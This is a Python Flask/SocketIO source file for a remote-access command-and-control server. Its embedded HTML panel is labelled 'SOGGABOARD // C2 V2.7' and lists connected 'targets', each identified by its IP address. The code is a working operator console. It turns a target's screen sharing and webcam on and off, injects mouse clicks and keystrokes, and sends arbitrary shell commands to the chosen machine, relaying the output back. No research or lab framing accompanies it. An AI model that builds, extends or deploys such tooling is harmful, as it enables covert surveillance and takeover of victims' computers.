import eventlet
eventlet.monkey_patch()

from flask import Flask, render_template_string, request
from flask_socketio import SocketIO, emit
import socket
import psutil # You might need: pip install psutil

app = Flask(__name__)
app.config['SECRET_KEY'] = 'sogga_v27_dynamic'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

# --- GLOBAL STATE ---
connected_targets = {} 

def get_all_server_ips():
    """Finds all active network interface IPs (Ethernet, Wi-Fi, etc.)"""
    ip_list = []
    interfaces = psutil.net_if_addrs()
    for interface_name, interface_addresses in interfaces.items():
        for address in interface_addresses:
            if address.family == socket.AF_INET: # Look for IPv4
                if not address.address.startswith("127."): # Ignore Loopback
                    ip_list.append(address.address)
    return ip_list

# Ask for Port at startup
try:
    print("\n[?] CONFIGURATION")
    user_port = input("Enter Port for SoggaBoard (Default 8888): ").strip()
    SELECTED_PORT = int(user_port) if user_port else 8888
except ValueError:
    print("[!] Invalid input. Defaulting to 8888.")
    SELECTED_PORT = 8888

ACTIVE_IPS = get_all_server_ips()

DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>SOGGABOARD // C2 V2.7</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <style>
        :root { --neon: #00ff41; --danger: #ff003c; --bg: #020202; --ui: #0a0a0c; }
        * { box-sizing: border-box; }
        body { background: var(--bg); color: var(--neon); font-family: 'Consolas', monospace; margin: 0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
        
        .top-nav { height: 60px; background: #000; border-bottom: 2px solid var(--neon); padding: 0 20px; display: flex; justify-content: space-between; align-items: center; }
        .ping-dot { height: 8px; width: 8px; background: var(--neon); border-radius: 50%; display: inline-block; box-shadow: 0 0 8px var(--neon); }

        .main-layout { display: grid; grid-template-columns: 1fr 400px; height: calc(100vh - 140px); gap: 15px; padding: 15px; }

        .viewer { background: #000; border: 1px solid #1a1a1a; display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden; height: 100%; transition: 0.3s; }
        #live-view { max-width: 100%; max-height: 100%; object-fit: contain; }

        .right-pane { display: flex; flex-direction: column; height: 100%; overflow: hidden; gap: 10px; }
        .ip-box { background: #111; border: 1px dashed #333; padding: 10px; font-size: 10px; color: #888; margin-bottom: 5px; }
        
        .target-list { height: 150px; background: var(--ui); border: 1px solid #222; overflow-y: auto; padding: 5px; font-size: 12px; }
        .target-item { padding: 8px; border-bottom: 1px solid #111; cursor: pointer; }
        .target-item.active { border-left: 3px solid var(--neon); background: #151515; }

        .console-wrap { flex: 1; display: flex; flex-direction: column; background: var(--ui); border: 1px solid #222; border-radius: 4px; overflow: hidden; }
        #console-output { flex: 1; padding: 15px; font-size: 11px; overflow-y: auto; white-space: pre-wrap; background: rgba(0,0,0,0.9); }

        .footer { height: 80px; background: #000; border-top: 1px solid #1a1a1a; display: flex; gap: 10px; justify-content: center; align-items: center; }
        button { background: transparent; color: var(--neon); border: 1px solid var(--neon); padding: 10px 15px; cursor: pointer; text-transform: uppercase; font-size: 11px; font-weight: bold; }
        button:hover { background: var(--neon); color: #000; box-shadow: 0 0 10px var(--neon); }
        input { background: #000; border: 1px solid #333; color: var(--neon); padding: 10px; width: 350px; outline: none; }
    </style>
</head>
<body onkeydown="handleKeyboard(event)">
    <div class="top-nav">
        <div style="font-weight:900; letter-spacing:3px;">SOGGABOARD <span style="color:var(--neon)">// V2.7</span></div>
        <div style="font-size:12px;"><span id="pinger" class="ping-dot"></span> STATUS: <span id="c-status">STANDBY</span></div>
        <div style="font-size:12px;">ACTIVE: <span id="target-id" style="color:white">NONE</span> | <span id="target-ip" style="color:white">0.0.0.0</span></div>
    </div>

    <div class="main-layout">
        <div id="view-container" class="viewer" onclick="handleScreenClick(event)">
            <img id="live-view" src="">
            <div id="osd" style="position:absolute; bottom:10px; left:10px; font-size:10px; background:rgba(0,0,0,0.8); padding:5px; border:1px solid #333;">SIGNAL: IDLE</div>
        </div>

        <div class="right-pane">
            <div class="ip-box">
                <b>LISTENING ON:</b><br>
                {% for ip in server_ips %}
                   >> {{ ip }}:{{ port }}<br>
                {% endfor %}
            </div>
            <div class="target-list" id="target-list">
                <div style="padding:10px; color:#555;">No clients connected...</div>
            </div>
            <div class="console-wrap">
                <div id="console-output">>> SOGGABOARD KERNEL READY...</div>
            </div>
        </div>
    </div>

    <div class="footer">
        <button onclick="sendAction('start_share')">SCR ON</button>
        <button onclick="sendAction('stop_share')">SCR OFF</button>
        <button onclick="sendAction('start_webcam')">CAM ON</button>
        <button onclick="sendAction('stop_webcam')">CAM OFF</button>
        <button id="ctrl-btn" onclick="toggleControl()">CTRL: OFF</button>
        <input type="text" id="cmd-input" placeholder="Enter shell command..." onkeydown="if(event.key==='Enter')sendCmd()">
        <button onclick="sendCmd()">EXE</button>
    </div>

    <script>
        const socket = io();
        const view = document.getElementById('live-view');
        const consoleBox = document.getElementById('console-output');
        let controlEnabled = false;
        let activeSid = null;

        function log(msg) {
            consoleBox.innerHTML += `\\n[${new Date().toLocaleTimeString()}] ${msg}`;
            consoleBox.scrollTop = consoleBox.scrollHeight;
        }

        setInterval(() => {
            const pinger = document.getElementById('pinger');
            pinger.style.opacity = (pinger.style.opacity == "0") ? "1" : "0";
        }, 1000);

        socket.on('update_clients', (clients) => {
            const list = document.getElementById('target-list');
            list.innerHTML = "";
            const keys = Object.keys(clients);
            
            if(keys.length === 0) {
                list.innerHTML = '<div style="padding:10px; color:#555;">No clients connected...</div>';
                return;
            }

            keys.forEach(sid => {
                const c = clients[sid];
                const div = document.createElement('div');
                div.className = `target-item ${sid === activeSid ? 'active' : ''}`;
                div.innerHTML = `<b>${c.name}</b><br><span style="color:#666; font-size:10px;">${c.ip}</span>`;
                div.onclick = () => {
                    activeSid = sid;
                    document.getElementById('target-id').innerText = c.name;
                    document.getElementById('target-ip').innerText = c.ip;
                    document.getElementById('c-status').innerText = "LINKED";
                    log("TARGET SET: " + c.name);
                    socket.emit('set_active_target', {sid: sid});
                    document.querySelectorAll('.target-item').forEach(el => el.classList.remove('active'));
                    div.classList.add('active');
                };
                list.appendChild(div);
            });
        });

        socket.on('stream_frame', (data) => { 
            if(data.sid === activeSid) {
                view.src = "data:image/jpeg;base64," + data.frame; 
                document.getElementById('osd').innerText = "FEED: " + data.type.toUpperCase();
            }
        });

        socket.on('shell_response', (data) => { log("OUT >> " + data.output); });

        function toggleControl() {
            controlEnabled = !controlEnabled;
            const btn = document.getElementById('ctrl-btn');
            btn.innerText = controlEnabled ? "CTRL: ON" : "CTRL: OFF";
            document.getElementById('view-container').style.borderColor = controlEnabled ? "var(--danger)" : "#1a1a1a";
        }

        function handleScreenClick(e) {
            if(!controlEnabled || !activeSid) return;
            const rect = view.getBoundingClientRect();
            const x = (e.clientX - rect.left) / rect.width;
            const y = (e.clientY - rect.top) / rect.height;
            socket.emit('client_command', { sid: activeSid, action: 'click', x: x, y: y });
        }

        function handleKeyboard(e) {
            if(!controlEnabled || !activeSid || document.activeElement.id === 'cmd-input') return;
            socket.emit('client_command', { sid: activeSid, action: 'keypress', key: e.key });
        }

        function sendCmd() {
            const val = document.getElementById('cmd-input').value;
            if(val && activeSid) { 
                socket.emit('client_command', {sid: activeSid, action: 'shell', data: val}); 
                document.getElementById('cmd-input').value = ""; 
            }
        }
        
        function sendAction(act) { 
            if(!activeSid) return;
            if(act.includes('stop')) { view.src = ""; }
            socket.emit('client_command', {sid: activeSid, action: act}); 
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(DASHBOARD_HTML, server_ips=ACTIVE_IPS, port=SELECTED_PORT)

@socketio.on('register_client')
def handle_identity(data):
    sid = request.sid
    connected_targets[sid] = {'name': data.get('name'), 'ip': request.remote_addr, 'active': True}
    emit('update_clients', connected_targets, broadcast=True)

@socketio.on('disconnect')
def handle_disconnect():
    sid = request.sid
    if sid in connected_targets:
        del connected_targets[sid]
        emit('update_clients', connected_targets, broadcast=True)

@socketio.on('client_command')
def handle_command(data):
    target_sid = data.get('sid')
    emit('dispatch', data, room=target_sid)

@socketio.on('frame_data')
def handle_frame(data):
    data['sid'] = request.sid
    emit('stream_frame', data, broadcast=True)

@socketio.on('shell_response')
def handle_shell(data):
    emit('shell_response', data, broadcast=True)

if __name__ == '__main__':
    print(f"\n--- SOGGABOARD V2.7 ---")
    for ip in ACTIVE_IPS:
        print(f"[*] LISTENING AT: http://{ip}:{SELECTED_PORT}")
    socketio.run(app, host='0.0.0.0', port=SELECTED_PORT, debug=False)
